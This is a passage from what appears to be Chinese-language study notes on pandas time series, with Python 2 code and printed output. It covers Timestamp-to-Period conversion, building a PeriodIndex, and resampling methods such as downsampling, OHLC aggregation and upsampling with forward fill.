<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">2012Q4</span><br><span class="line"></span><br><span class="line">2011-11-01</span><br><span class="line"></span><br><span class="line">2012-01-31</span><br><span class="line"></span><br><span class="line">2012-01-30 16:00</span><br><span class="line"></span><br><span class="line">2012-01-30 16:00:00</span><br><span class="line"></span><br><span class="line">2011Q3    0</span><br><span class="line">2011Q4    1</span><br><span class="line">2012Q1    2</span><br><span class="line">2012Q2    3</span><br><span class="line">2012Q3    4</span><br><span class="line">2012Q4    5</span><br><span class="line">Freq: Q-JAN, dtype: int32</span><br><span class="line"></span><br><span class="line">2010-10-28 16:00:00    0</span><br><span class="line">2011-01-28 16:00:00    1</span><br><span class="line">2011-04-28 16:00:00    2</span><br><span class="line">2011-07-28 16:00:00    3</span><br><span class="line">2011-10-28 16:00:00    4</span><br><span class="line">2012-01-30 16:00:00    5</span><br><span class="line">dtype: int32</span><br></pre></td></tr></table></figure>
<h3 id="将Timestamp转换成Period-及其反向过程"><a href="#将Timestamp转换成Period-及其反向过程" class="headerlink" title="将Timestamp转换成Period(及其反向过程)"></a>将Timestamp转换成Period(及其反向过程)</h3><ol>
<li><p>通过to~period方法将时间戳索引的Series和DataFrame转换成已时期索引~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">3</span>, freq = <span class="string">'M'</span>)</span><br><span class="line">ts = pd.Series(np.random.randn(<span class="number">3</span>), index = rng)</span><br><span class="line">pts = ts.to_period()</span><br><span class="line"><span class="keyword">print</span> ts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> pts</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2000-01-31    1.168085</span><br><span class="line">2000-02-29    0.205205</span><br><span class="line">2000-03-31    1.301836</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2000-01    1.168085</span><br><span class="line">2000-02    0.205205</span><br><span class="line">2000-03    1.301836</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于时期指的是非重叠时间区间，所以对于给定的频率，一个时间戳只能属于一个时期</p>
</li>
<li><p>新PeriodIndex的频率默认是从时间戳推断出来的，可以指定任何别的频率，结果允许重复时期</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/29/2000'</span>, periods = <span class="number">6</span>, freq = <span class="string">'D'</span>)</span><br><span class="line">ts2 = pd.Series(np.random.randn(<span class="number">6</span>), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts2.to_period(<span class="string">'M'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#转换为时间戳，使用过to_timestamp</span></span><br><span class="line">pts = ts.to_period()</span><br><span class="line"><span class="keyword">print</span> pts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pts.to_timestamp(how = <span class="string">'end'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">2000-01    0.596077</span><br><span class="line">2000-01    1.005846</span><br><span class="line">2000-01   -0.141036</span><br><span class="line">2000-02   -0.205156</span><br><span class="line">2000-02    1.581535</span><br><span class="line">2000-02    0.146273</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2000-01    1.168085</span><br><span class="line">2000-02    0.205205</span><br><span class="line">2000-03    1.301836</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2000-01-31    1.168085</span><br><span class="line">2000-02-29    0.205205</span><br><span class="line">2000-03-31    1.301836</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="通过数组创建Periodindex"><a href="#通过数组创建Periodindex" class="headerlink" title="通过数组创建Periodindex"></a>通过数组创建Periodindex</h3><ol>
<li><p>固定的数据通常会将时间信息分开存放在多格列</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">'./pydata-book-master/ch08/macrodata.csv'</span>)</span><br><span class="line"><span class="keyword">print</span> data.year[<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.quarter[<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.columns</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">198    2008.0</span><br><span class="line">199    2008.0</span><br><span class="line">200    2009.0</span><br><span class="line">201    2009.0</span><br><span class="line">202    2009.0</span><br><span class="line">Name: year, dtype: float64</span><br><span class="line"></span><br><span class="line">198    3.0</span><br><span class="line">199    4.0</span><br><span class="line">200    1.0</span><br><span class="line">201    2.0</span><br><span class="line">202    3.0</span><br><span class="line">Name: quarter, dtype: float64</span><br><span class="line"></span><br><span class="line">Index([u&apos;year&apos;, u&apos;quarter&apos;, u&apos;realgdp &apos;, u&apos;realcons&apos;, u&apos;realinv&apos;, u&apos;realgovt&apos;,</span><br><span class="line">       u&apos;realdpi&apos;, u&apos;cpi&apos;, u&apos;m1&apos;, u&apos;tbilrate&apos;, u&apos;unemp&apos;, u&apos;pop&apos;, u&apos;infl&apos;,</span><br><span class="line">       u&apos;realint&apos;],</span><br><span class="line">      dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>将多个数组以及一个频率传入PeriodIndex，就可以将他们合并成DF的一个索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index = pd.PeriodIndex(year = data.year, quarter = data.quarter, freq = <span class="string">'Q-DEC'</span>)</span><br><span class="line"><span class="keyword">print</span> index[<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">data.index = index</span><br><span class="line"><span class="keyword">print</span> data.infl[<span class="number">-5</span>:]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PeriodIndex([&apos;2008Q3&apos;, &apos;2008Q4&apos;, &apos;2009Q1&apos;, &apos;2009Q2&apos;, &apos;2009Q3&apos;], dtype=&apos;int64&apos;, freq=&apos;Q-DEC&apos;)</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2008Q3   -3.16</span><br><span class="line">2008Q4   -8.79</span><br><span class="line">2009Q1    0.94</span><br><span class="line">2009Q2    3.37</span><br><span class="line">2009Q3    3.56</span><br><span class="line">Freq: Q-DEC, Name: infl, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="重采样及频率转换"><a href="#重采样及频率转换" class="headerlink" title="重采样及频率转换"></a>重采样及频率转换</h2><h3 id="重采样-resampling-是将时间序列从一个频率转换到另一个频率的处理过程"><a href="#重采样-resampling-是将时间序列从一个频率转换到另一个频率的处理过程" class="headerlink" title="重采样(resampling)是将时间序列从一个频率转换到另一个频率的处理过程"></a>重采样(resampling)是将时间序列从一个频率转换到另一个频率的处理过程</h3><ol>
<li><p>将高频率数据聚合到低频率称为降采样(downsampling)</p>
</li>
<li><p>将低频率数据转换到高频率称为升采样(upsampling)</p>
</li>
</ol>
<h3 id="pandas对象都有一个resample方法，它是各种频率转换工作的主要函数"><a href="#pandas对象都有一个resample方法，它是各种频率转换工作的主要函数" class="headerlink" title="pandas对象都有一个resample方法，它是各种频率转换工作的主要函数"></a>pandas对象都有一个resample方法，它是各种频率转换工作的主要函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">100</span>, freq = <span class="string">'D'</span>)</span><br><span class="line">ts = pd.Series(np.random.randn(len(rng)), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'M'</span>, how = <span class="string">'mean'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'M'</span>, how = <span class="string">'mean'</span>, kind = <span class="string">'period'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2000-01-31    0.246297</span><br><span class="line">2000-02-29   -0.087421</span><br><span class="line">2000-03-31   -0.194359</span><br><span class="line">2000-04-30    0.280356</span><br><span class="line">Freq: M, dtype: float64</span><br><span class="line"></span><br><span class="line">2000-01    0.246297</span><br><span class="line">2000-02   -0.087421</span><br><span class="line">2000-03   -0.194359</span><br><span class="line">2000-04    0.280356</span><br><span class="line">Freq: M, dtype: float64</span><br></pre></td></tr></table></figure>
<h3 id="resample方法的参数"><a href="#resample方法的参数" class="headerlink" title="resample方法的参数"></a>resample方法的参数</h3><div class="table-container">
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>freq</td>
<td>表示重采样频率的字符串或DateOffset</td>
</tr>
<tr>
<td></td>
<td>列如’M’ ‘5min’或 Second(15)</td>
</tr>
<tr>
<td>how = ‘mean’</td>
<td>用于产生聚合值的函数名或数组函数</td>
</tr>
<tr>
<td></td>
<td>列如 ‘mean’ ‘ohlc’ ‘np.max’等</td>
</tr>
<tr>
<td></td>
<td>默认为’mean’</td>
</tr>
<tr>
<td></td>
<td>其他常用的: first, last median ohlc max min</td>
</tr>
<tr>
<td>axis = 0</td>
<td>重采样的轴，默认为axis = 0</td>
</tr>
<tr>
<td>fill~method~ = None</td>
<td>盛彩阳时如何插值，比如’ffill’ ‘bfill’</td>
</tr>
<tr>
<td></td>
<td>默认为不差值</td>
</tr>
<tr>
<td>closed = ‘right’</td>
<td>在降采样中，各时间段的哪一端是闭合(包含)</td>
</tr>
<tr>
<td></td>
<td>‘right’或 ‘left’, 默认为’left’</td>
</tr>
<tr>
<td>label = ‘right’</td>
<td>在降采样中，如何设置聚合值的标签</td>
</tr>
<tr>
<td></td>
<td>‘right’或 ‘left’（面元的右边界或左边界）</td>
</tr>
<tr>
<td></td>
<td>列如9:30到9:35之间的这5分钟被标记为9:30或9:35</td>
</tr>
<tr>
<td></td>
<td>默认为”left”</td>
</tr>
<tr>
<td>loffset = None</td>
<td>面元标签的时间校正值</td>
</tr>
<tr>
<td></td>
<td>比如’-1s’/Second(-1)用于将聚合标签调早1秒</td>
</tr>
<tr>
<td>limit = None</td>
<td>再向前或向后填充时，允许填充的最大时间数</td>
</tr>
<tr>
<td>kind = None</td>
<td>聚合到时期(“period”)或时间戳(“timestamp”)</td>
</tr>
<tr>
<td></td>
<td>默认聚合到时间序列的索引类型</td>
</tr>
<tr>
<td>convention= None</td>
<td>当重采样时期时，将低频率转换到高频率所用的约定</td>
</tr>
<tr>
<td></td>
<td>(“sart”或”end”),默认为”end”</td>
</tr>
</tbody>
</table>
</div>
<h3 id="降采样"><a href="#降采样" class="headerlink" title="降采样"></a>降采样</h3><ol>
<li><p>带聚合的数据不必拥有固定的频率，期望的频率会自动定义聚合的面元边界</p>
</li>
<li><p>需要考虑的两样东西</p>
<ul>
<li>各区间哪边是闭合的</li>
<li><p>如何标记各个聚合面元，用区间的开头还是末尾</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">12</span>, freq = <span class="string">'T'</span>)</span><br><span class="line">ts = pd.Series(np.arange(<span class="number">12</span>), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果想要将这些一分钟的数据聚合到5分钟的块里, 默认是left</span></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'5min'</span>, how = <span class="string">'sum'</span>, closed = <span class="string">'right'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'5min'</span>, how = <span class="string">'sum'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#label 默认为left</span></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'5min'</span>, how = <span class="string">'sum'</span>, label = <span class="string">'right'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对数据做些位移， 比如通过减去1秒来更容易明白时间戳表示哪个区间</span></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'5min'</span>, how = <span class="string">'sum'</span>, loffset = <span class="string">'-1s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此外可可用用结果对象的shift方法来位移</span></span><br></pre></td></tr></table></figure>
<p>#+begin~example~ 2000-01-01 00:00:00 0 2000-01-01 00:01:00 1<br>2000-01-01 00:02:00 2 2000-01-01 00:03:00 3 2000-01-01 00:04:00<br>4 2000-01-01 00:05:00 5 2000-01-01 00:06:00 6 2000-01-01<br>00:07:00 7 2000-01-01 00:08:00 8 2000-01-01 00:09:00 9<br>2000-01-01 00:10:00 10 2000-01-01 00:11:00 11 Freq: T, dtype:<br>int32</p>
<p>1999-12-31 23:55:00 0 2000-01-01 00:00:00 15 2000-01-01 00:05:00<br>40 2000-01-01 00:10:00 11 Freq: 5T, dtype: int32</p>
<p>2000-01-01 00:00:00 10 2000-01-01 00:05:00 35 2000-01-01<br>00:10:00 21 Freq: 5T, dtype: int32</p>
<p>2000-01-01 00:05:00 10 2000-01-01 00:10:00 35 2000-01-01<br>00:15:00 21 Freq: 5T, dtype: int32</p>
<p>1999-12-31 23:59:59 10 2000-01-01 00:04:59 35 2000-01-01<br>00:09:59 21 Freq: 5T, dtype: int32</p>
</li>
</ul>
<p>#+end~example~</p>
</li>
<li><p>OHLC重采样</p>
<ol>
<li><p>金融领域中有一个时间序列局和方式，即计算各面元的四个值：</p>
<ul>
<li>第一个值：开盘(open)</li>
<li>最后一个值： 收盘(close)</li>
<li>最大值： 最高(high)</li>
<li>最小值 最低(low)</li>
</ul>
</li>
<li><p>传入 how = ‘ohlc’即可得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'5min'</span>, how = <span class="string">'ohlc'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                     open  high  low  close</span><br><span class="line">2000-01-01 00:00:00     0     4    0      4</span><br><span class="line">2000-01-01 00:05:00     5     9    5      9</span><br><span class="line">2000-01-01 00:10:00    10    11   10     11</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>通过groupby进行重采样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">100</span>, freq = <span class="string">'D'</span>)</span><br><span class="line">ts = pd.Series(np.arange(<span class="number">100</span>), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts.groupby(<span class="keyword">lambda</span> x :x.month).mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ts.groupby(<span class="keyword">lambda</span> x: x.weekday).mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1    15</span><br><span class="line">2    45</span><br><span class="line">3    75</span><br><span class="line">4    95</span><br><span class="line">dtype: int32</span><br><span class="line"></span><br><span class="line">0    47.5</span><br><span class="line">1    48.5</span><br><span class="line">2    49.5</span><br><span class="line">3    50.5</span><br><span class="line">4    51.5</span><br><span class="line">5    49.0</span><br><span class="line">6    50.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="升采样和插值"><a href="#升采样和插值" class="headerlink" title="升采样和插值"></a>升采样和插值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">2</span>,<span class="number">4</span>),</span><br><span class="line">                     index = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">2</span>, freq = <span class="string">'W-WED'</span>),</span><br><span class="line">                     columns = [<span class="string">'Colorado'</span>, <span class="string">'Texas'</span>, <span class="string">'New York'</span>, <span class="string">'Ohio'</span>])</span><br><span class="line"><span class="keyword">print</span> frame[:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#将其重采样到日频率， 默认会引入缺失值</span></span><br><span class="line">df_daily = frame.resample(<span class="string">'D'</span>)</span><br><span class="line"><span class="keyword">print</span> df_daily</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#填充用fill_method</span></span><br><span class="line"><span class="keyword">print</span> frame.resample(<span class="string">'D'</span>, fill_method = <span class="string">'ffill'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加入限制</span></span><br><span class="line"><span class="keyword">print</span> frame.resample(<span class="string">'D'</span>, fill_method = <span class="string">'ffill'</span>, limit = <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意新的日期索引完全没必要跟旧的相交</span></span><br><span class="line"><span class="keyword">print</span> frame.resample(<span class="string">'W-THU'</span>, fill_method = <span class="string">'ffill'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">            Colorado     Texas  New York      Ohio</span><br><span class="line">2000-01-05 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-12 -1.031209  0.965049 -0.801320  0.266426</span><br><span class="line">DatetimeIndexResampler [freq=&lt;Day&gt;, axis=0, closed=left, label=left, convention=start, base=0]</span><br><span class="line"></span><br><span class="line">            Colorado     Texas  New York      Ohio</span><br><span class="line">2000-01-05 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-06 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-07 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-08 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-09 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-10 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-11 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-12 -1.031209  0.965049 -0.801320  0.266426</span><br><span class="line"></span><br><span class="line">            Colorado     Texas  New York      Ohio</span><br><span class="line">2000-01-05 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-06 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-07 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-08       NaN       NaN       NaN       NaN</span><br><span class="line">2000-01-09       NaN       NaN       NaN       NaN</span><br><span class="line">2000-01-10       NaN       NaN       NaN       NaN</span><br><span class="line">2000-01-11       NaN       NaN       NaN       NaN</span><br><span class="line">2000-01-12 -1.031209  0.965049 -0.801320  0.266426</span><br><span class="line"></span><br><span class="line">            Colorado     Texas  New York      Ohio</span><br><span class="line">2000-01-06 -2.079375  0.758852 -0.187726  0.390049</span><br><span class="line">2000-01-13 -1.031209  0.965049 -0.801320  0.266426</span><br></pre></td></tr></table></figure>
<h3 id="通过实践进行重采样"><a href="#通过实践进行重采样" class="headerlink" title="通过实践进行重采样"></a>通过实践进行重采样</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.random.randn(<span class="number">24</span>,<span class="number">4</span>),</span><br><span class="line">                     index = pd.period_range(<span class="string">'1-2000'</span>, <span class="string">'12-2001'</span>, freq = <span class="string">'M'</span>),</span><br><span class="line">                     columns = [<span class="string">'Colorado'</span>, <span class="string">'Texas'</span>, <span class="string">'New York'</span>, <span class="string">'Ohio'</span>])</span><br><span class="line"><span class="keyword">print</span> frame[:<span class="number">5</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">annual_frame = frame.resample(<span class="string">'A-DEC'</span>, how = <span class="string">'mean'</span>)</span><br><span class="line"><span class="keyword">print</span> annual_frame</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#升采样，需要决定在新频率中各区间的哪端放置原来的值</span></span><br><span class="line"><span class="comment">#就像asfreq方法一样，convention参数默认"start"， 可以设置成"end"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  Q-DEC：季度性(每年以12月结束) :不明白</span></span><br><span class="line"><span class="keyword">print</span> annual_frame.resample(<span class="string">'Q-DEC'</span>, fill_method = <span class="string">'ffill'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> annual_frame.resample(<span class="string">'Q-DEC'</span>, fill_method = <span class="string">'ffill'</span>, convention = <span class="string">'end'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">         Colorado     Texas  New York      Ohio</span><br><span class="line">2000-01  0.952261 -0.734059 -0.646535  0.795188</span><br><span class="line">2000-02 -0.133186 -0.275995 -0.623968 -0.215492</span><br><span class="line">2000-03  0.096732 -0.299782 -1.318219  1.653370</span><br><span class="line">2000-04  1.338270  1.197021 -1.086159 -0.289210</span><br><span class="line">2000-05  1.274459 -0.491662  0.726770 -0.624092</span><br><span class="line"></span><br><span class="line">      Colorado     Texas  New York      Ohio</span><br><span class="line">2000  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line"></span><br><span class="line">        Colorado     Texas  New York      Ohio</span><br><span class="line">2000Q1  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2000Q2  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2000Q3  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2000Q4  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q1 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line">2001Q2 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line">2001Q3 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line">2001Q4 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line"></span><br><span class="line">        Colorado     Texas  New York      Ohio</span><br><span class="line">2000Q4  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q1  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q2  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q3  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q4 -0.068266  0.454458 -0.011052  0.074813</span><br></pre></td></tr></table></figure>
<ol>
<li><p>由于时期指的是时间区间，所以升采样和降采样的规则就比较严格</p>
<ol>
<li><p>在降采样中，目标频率必须是源频率的子时期(subperiod)</p>
</li>
<li><p>在升采样中，目标频率必须是源频率的超时期(superperiod)</p>
<ol>
<li><p>如果不满足以上两条，则会发生异常</p>
</li>
<li><p>主要影响的是按季， 年 周计算的频率</p>
<ol>
<li><p>列如 Q-MAR定义的时间区间只能升采样为A-MAR, A-JUM, A-SEP,<br>A-DEC等</p>
